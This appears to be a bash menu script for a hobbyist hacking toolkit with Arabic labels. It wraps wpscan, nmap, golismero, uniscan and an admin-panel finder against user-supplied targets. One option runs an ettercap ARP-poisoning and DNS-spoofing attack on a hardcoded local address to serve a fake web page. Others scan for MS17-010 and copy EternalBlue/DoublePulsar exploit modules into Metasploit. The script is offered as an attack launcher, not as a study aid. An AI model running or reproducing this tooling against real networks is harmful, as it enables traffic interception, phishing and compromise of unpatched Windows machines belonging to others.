#!/bin/bash

clear
#DEFINED COLOR SETTINGS
RED=$(tput setaf 9 && tput bold)
GREEN=$(tput setaf 9 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 9 &&  tput bold)

cat << !
                    ----                    
               ,   ______  ,                
              /   _______   \               
             ((__---,,,---__))             
                (_) O O (_)_________        
                   \ _ /            |\      
                    o_o \ tool 5.0  | \     
                         \   _____  |  *   
                          |||   WW|||       
                          |||     |||       
!
sleep 5
clear

echo ""
echo $RED"    ██╗  ██╗███████╗██╗     ██╗      ██████╗     ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗ "
echo $RED"    ██║  ██║██╔════╝██║     ██║     ██╔═══██╗    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗"
echo $RED"    ███████║█████╗  ██║     ██║     ██║   ██║    ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║"
echo $RED"    ██╔══██║██╔══╝  ██║     ██║     ██║   ██║    ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║"
echo $RED"    ██║  ██║███████╗███████╗███████╗╚██████╔╝    ╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝"
echo $RED"    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝      ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ "
echo $RED"  ╦ ╦┌─┐┬  ┬  ┌─┐  ╦ ╦┌─┐┬─┐┬  ┌┬┐ "
echo $RED"  ╠═╣├┤ │  │  │ │  ║║║│ │├┬┘│   ││ "
echo $RED"  ╩ ╩└─┘┴─┘┴─┘└─┘  ╚╩╝└─┘┴└─┴─┘─┴┘ "
sleep 5
clear


echo $BLUE"                 ^_^ Tool Gihad Alkmaty ve 5.0 ^_^ "
echo $BLUE"               ___________________________________________________ "
echo $BLUE"               || 1  scan website wordpress tool wpscan         || "
echo $BLUE"               ||     ﺓﺍﺩﺍ ﻲﺑ wordpress ﻊﻗﺍﻮﻤﻟ​ﺍ ﺺﺤﻓ wpscan      || " 
echo $BLUE"               ||-----------------------------------------------|| "
echo $BLUE"               || 2  scan website tool golismero                || "
echo $BLUE"               ||    ﺓﺍﺩﺍ ﻲﺑ ﻊﻗﺍﻮﻤﻟ​ﺍ ﺺﺤﻓ golismero              || "
echo $BLUE"               ||-----------------------------------------------|| " 
echo $BLUE"               || 3  scan ip tool nmap                          || "
echo $BLUE"               ||   ﺓﺮﻐﺗ ﻦﻣ ﺓﺰﻬﺟﻻ​ﺍ ﺺﺤﻓ                          || "
echo $BLUE"               ||-----------------------------------------------|| " 
echo $BLUE"               || 5  control Board website                      || "
echo $BLUE"               || ﻊﻗﺍﻮﻤﻟ ﻢﻜﺤﺘﻟ​ﺍ ﺕﺎﺣﻮﻟ ﺝﺍﺮﺨﺘﺳﺍ                   || "
echo $BLUE"               ||-----------------------------------------------|| "
echo $BLUE"               ||-----------------------------------------------|| " 
echo $BLUE"               || 6  scan website tool uniscan                  || "
echo $BLUE"               || ﺓﺍﺩﺍ ﻲﺑ ﻊﻗﺍﻮﻤﻟ​ﺍ ﺺﺤﻓ                           || "
echo $BLUE"               ||-----------------------------------------------|| " 
echo $BLUE"               || 7  The complexity of my browsers by payload   || "
echo $BLUE"               || ﺔﻜﺒﺷ ﻞﺧﺍﺩ ﻕﺍﺮﺘﺧﺍﻭ ﺩﻮﻠﻳﺎﺑ ﻲﺑ ﺕﺎﺤﻔﺼﺘﻤﻟ​ﺍ ﺪﻴﻘﻌﺗ   || "
echo $BLUE"               ||-----------------------------------------------|| " 
echo $BLUE"               || 8 scan ip On MS17-010                         || " 
echo $BLUE"               ||    MS17-010  ﺓﺮﻐﺗ ﻦﻣ ﺓﺰﻬﺟﻻ​ﺍ ﺺﺤﻓ               || "
echo $BLUE"               ||-----------------------------------------------|| "                                     
echo $BLUE"               || 9   MetasploitﻲﻟdepsوEternalblue ﻞﻘﻧ          || "                                            
echo $BLUE"               ||-----------------------------------------------|| "                                           
echo $BLUE"               || 10  MS17_010_Eternalblue << ﺪﻳﺪﺠﻟ​ﺍ ﺚﺑﺮﻜﺴﻟ​ﺍ ﻞﻘﻧ|| "
echo $BLUE"               ||                                               || "
echo $BLUE"               ||-----------------------------------------------|| "
echo $BLUE"               || 20      ﻞﻤﺟ ﺕﻮﻔﻴﺑ ﺏﺎﺒﻟ​ﺍ ﺄﻌﺒﻃﻭ ﺝﻭﺮﺨﻠﻟ ﻥﻻ​ﺍﻭ     || "
echo $BLUE"               ||                                               || "
echo $BLUE"               ||-----------------------------------------------|| "
echo $BLUE"               ||______________________________________________ || "
echo $BLUE"                       tool Gihad Alkmaty ve... 5.0 "$STAND
read menuoption                   

if [ $menuoption = "1" ]; then
echo "site?"
read target 
wpscan --url $target
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "2" ]; then
echo "site?"
read target 
golismero scan $target
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "3" ]; then
echo "site?"
read target 
nmap -v $target
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "5" ]; then
echo "Site"
read target
echo ""
cd /root/Desktop/GihadAlkmaty5/GihadAlkmaty5/
python Sadiqullah.py -t $target -v
echo ""
read -p "ENTER"
bash /root/Desktop/GihadAlkmaty5/GihadAlkmaty5.sh
else

if [ $menuoption = "6" ]; then
echo "Site"
read target
echo ""
uniscan -u $target -qweds
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "7" ]; then
read target
leafpad /root/Desktop/GihadAlkmaty5/index.html
echo "ok?  /var/www/html/ ﺭﺎﺴﻤﻟ​ﺍ ﺍﺪﻫ ﻰﻟ​ﺍ ﺔﻠﻘﻧﺍ  Desktop ﻰﻠﻋ index ﺔﻤﺳﺍ ﻒﻠﻣ ﻚﻠﻄﺣﺍ ﺡﺭ ﻥﻻ​ﺍ"
read $target
cp /root/Desktop/GihadAlkmaty5/index.html /root/Desktop/
cp /root/Desktop/GihadAlkmaty5/style.css /root/Desktop/
echo " ok ? ﺔﺘﻠﻘﻧ"
read $target
read target
ettercap -i eth0 -T -q -P dns_spoof -M ARP /192.168.15.2//
echo ""
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "8" ]; then
echo "ﻪﻠﻗﺎﻧ ﻮﻣ ﺩﺍ ﺪﻳﺪﺠﻟ​ﺍ Nmap ﻒﻠﻣ ﻚﻠﻘﻧﺍ"
read target
mv /root/Desktop/GihadAlkmaty5/smb-vuln-ms17-010.nse /usr/share/nmap/scripts/
echo "ip ﻂﺣ ﺺﺤﻔﺗ ﻙﺪﺑ ﻥﺎﻛ ﺩﺍ ﻥﻻ​ﺍﻭ"
read target
nmap -d -sC -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010.nse $target
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "9" ]; then
echo "? ﻚﻠﻘﻧﺍ"
read target
mv /root/Desktop/GihadAlkmaty5/Eternalblue-Doublepulsar-Metasploit/deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/
mv /root/Desktop/GihadAlkmaty5/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
echo ""
read -p "ENTER"
bash GihadAlkmaty5.sh
else

if [ $menuoption = "10" ]; then
echo "? ﻚﻠﻘﻧﺍ"
read target
mv /root/Desktop/GihadAlkmaty5/ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
echo ""
read -p "ENTER"
./GihadAlkmaty5.sh
else

if [ $menuoption = "20" ]; then
exit
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi